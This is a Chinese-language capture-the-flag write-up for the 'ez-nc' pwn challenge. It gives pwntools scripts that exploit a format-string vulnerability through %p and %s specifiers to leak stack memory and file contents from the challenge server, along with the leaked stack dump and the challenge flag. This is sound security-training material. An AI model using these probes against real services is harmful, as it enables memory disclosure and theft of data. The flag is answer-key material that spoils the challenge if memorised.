# ez-nc
1. 题目来源：ctfplus平台 polarisctf2026-ez-nc
2. PWN + 格式化字符串（leak）
## 解题思路
> 格式化字符串盲打泄露栈内存
提示让我们下载 ez-nc  
1. 初步测试
  可以发现  
  - 文件路径名长度小于7
  - 能够返回存在文件的内容（输入"/bin/sh"返回了一大串二进制文本）
  - 直接输入"ez-nc"提示无法访问，输入"/flag" 发现没有内容
  - 存在格式化字符串漏洞
  可能代码中有类似结构  
  ```c
  char buf[8];
  char template[...];
  scanf("%7s", buf);
  // 字符串拼接操作
  printf(template);
  ```
2. 获取栈内存数据
  编写如下脚本`ez-nc_1.py`  
  ```python
  from pwn import *
  r = remote('nc1.ctfplus.cn', 31341)
  for i in range(1, 128):
    r.sendlineafter(b'download:', b'%' + str(i).encode() + b'$p')
    raw = r.recvuntil(b' not')[:-4]
    if(raw == b' (nil)'):
      data = 0
    else:
      data = int(raw, 16)
    print(f'{i} : 0x{data:x}')
  ```
  其中一次输出如下    
  ```text
  1 : 0x7ffce6011473
  2 : 0x204
  3 : 0x0
  4 : 0x5583456182a0
  5 : 0x0
  6 : 0x7ffce6011789
  7 : 0x64
  8 : 0x70243825
  9 : 0xf89722b89b883c00
  10 : 0x1
  11 : 0x7f4ed149bd90
  12 : 0x0
  13 : 0x558344387369
  14 : 0x1e6011580
  15 : 0x7ffce6011598
  16 : 0x0
  17 : 0x2542d2a85326e84f
  18 : 0x7ffce6011598
  19 : 0x558344387369
  20 : 0x558344389d38
  21 : 0x7f4ed16d7040
  22 : 0xdabb1eaa7a04e84f
  23 : 0xdbdf703b29ace84f
  24 : 0x7f4e00000000
  25 : 0x0
  26 : 0x0
  27 : 0x0
  28 : 0x0
  29 : 0xf89722b89b883c00
  30 : 0x0
  31 : 0x7f4ed149be40
  32 : 0x7ffce60115a8
  33 : 0x558344389d38
  34 : 0x7f4ed16d82e0
  35 : 0x0
  36 : 0x0
  37 : 0x558344387280
  38 : 0x7ffce6011590
  39 : 0x0
  40 : 0x0
  41 : 0x5583443872a5
  42 : 0x7ffce6011588
  43 : 0x1c
  44 : 0x1
  45 : 0x7ffce6012e10
  46 : 0x0
  47 : 0x7ffce6012e18
  48 : 0x7ffce6012e2d
  49 : 0x7ffce6012e49
  50 : 0x7ffce6012e8c
  51 : 0x7ffce6012e97
  52 : 0x7ffce6012ed0
  53 : 0x7ffce6012f12
  54 : 0x7ffce6012f34
  55 : 0x7ffce6012f53
  56 : 0x7ffce6012f75
  57 : 0x7ffce6012f8e
  58 : 0x7ffce6012fc2
  59 : 0x7ffce6012fd3
  60 : 0x7ffce6012fd9
  61 : 0x0
  62 : 0x21
  63 : 0x7ffce61f5000
  64 : 0x33
  65 : 0x6f0
  66 : 0x10
  67 : 0x78bfbff
  68 : 0x6
  69 : 0x1000
  70 : 0x11
  71 : 0x64
  72 : 0x3
  73 : 0x558344386040
  74 : 0x4
  75 : 0x38
  76 : 0x5
  77 : 0xd
  78 : 0x7
  79 : 0x7f4ed169d000
  80 : 0x8
  81 : 0x0
  82 : 0x9
  83 : 0x558344387280
  84 : 0xb
  85 : 0x3e8
  86 : 0xc
  87 : 0x3e8
  88 : 0xd
  89 : 0x3e8
  90 : 0xe
  91 : 0x3e8
  92 : 0x17
  93 : 0x0
  94 : 0x19
  95 : 0x7ffce6011779
  96 : 0x1a
  97 : 0x2
  98 : 0x1f
  99 : 0x7ffce6012ff0
  100 : 0xf
  101 : 0x7ffce6011789
  102 : 0x0
  103 : 0x0
  104 : 0x0
  105 : 0x9722b89b883ccd00
  106 : 0x2792a169542992f8
  107 : 0x34365f36387874
  108 : 0x0
  109 : 0x0
  110 : 0x0
  111 : 0x0
  112 : 0x0
  113 : 0x0
  114 : 0x0
  115 : 0x0
  116 : 0x0
  117 : 0x0
  118 : 0x0
  119 : 0x0
  120 : 0x0
  121 : 0x0
  122 : 0x0
  123 : 0x0
  124 : 0x0
  125 : 0x0
  126 : 0x0
  127 : 0x0
  ```
  分析可得  
  - 这是一个64位程序
  - 与其他输出对比，offset 9 与 offset 29 处有8个字节且低位为0，应当是 canary
3. 查看栈内存指针对应的字符串
  编写如下代码
  ```python
  from pwn import *
  list = [0] * 128
  for i in range(1, 128):
    try:
      with remote('nc1.ctfplus.cn', 31341) as r:
        r.sendlineafter(b'download: ', b'%' + str(i).encode() + b'$s')
        content = r.recvuntil(b' not')[:-4]
        list[i] = content
    except:
      list[i] = b'ILLEGAL MEMORY'

  for i in range(1, 128):
    print(f'{i} :', list[i])

  ```
  运行后发现 offset 45 和 offset 99 中出现大量内容，且在内容末尾发现"forbidden"等字样，推测这就是`ez-nc`文件内容
## Flag
在文件内容中发现flag
```text
polarisctf{1e26bf46-d73e-464a-ba9e-d7a085ff3dec}
```